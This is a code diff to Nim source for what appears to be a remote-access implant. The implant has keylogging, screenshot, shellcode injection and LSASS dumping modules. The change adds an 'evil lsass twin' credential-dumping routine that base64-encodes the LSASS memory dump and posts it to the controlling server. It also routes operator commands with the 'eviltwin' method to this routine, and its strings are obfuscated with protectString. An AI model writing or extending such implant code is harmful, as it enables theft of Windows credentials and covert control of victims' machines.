@@ -1,6 +1,7 @@
 # Internal imports
 import ../config
 import ../common
+import utils/incl/[evillsasstwin]
 import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex]
 # Internal imports
 import std/[tables, nativesockets, json]
@@ -33,6 +34,7 @@ proc wrap_keylog_dump(): bool
 proc wrap_keylog_stop(): bool
 proc wrap_examine_lsass(): bool
 proc dump_lsass(dump_method: string): bool
+proc wrap_evil_lsass_twin(): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
@@ -353,6 +355,27 @@ proc dump_lsass(dump_method: string): bool =
     return is_success
 
 
+proc wrap_evil_lsass_twin(): bool =
+    var is_success: bool
+    var file_content_base64: string
+
+    var dump_string = evil_lsass_twin()
+    if dump_string == "":
+        is_success = false
+        file_content_base64 = could_not_retrieve
+    else:
+        is_success = true
+        file_content_base64 = encode_64(dump_string, is_bin=true)
+
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("file_content_base64"): file_content_base64
+    }.toOrderedTable
+    is_success = post_data(client, protectString("lsass") , $data)
+
+    return is_success
+
+
 proc dump_sam(): bool =
     var is_success: bool
     var sam_base64: string
@@ -646,7 +669,11 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("lsass-examine"):
             is_success = wrap_examine_lsass()
         of protectString("lsass"):
-            is_success = dump_lsass(command[protectString("dump_method")].getStr())
+            var dump_method = command[protectString("dump_method")].getStr()
+            if dump_method == protectString("eviltwin"):
+                is_success = wrap_evil_lsass_twin()
+            else:
+                is_success = dump_lsass(dump_method)
         of protectString("sam"):
             is_success = dump_sam()
         of protectString("shellc"):
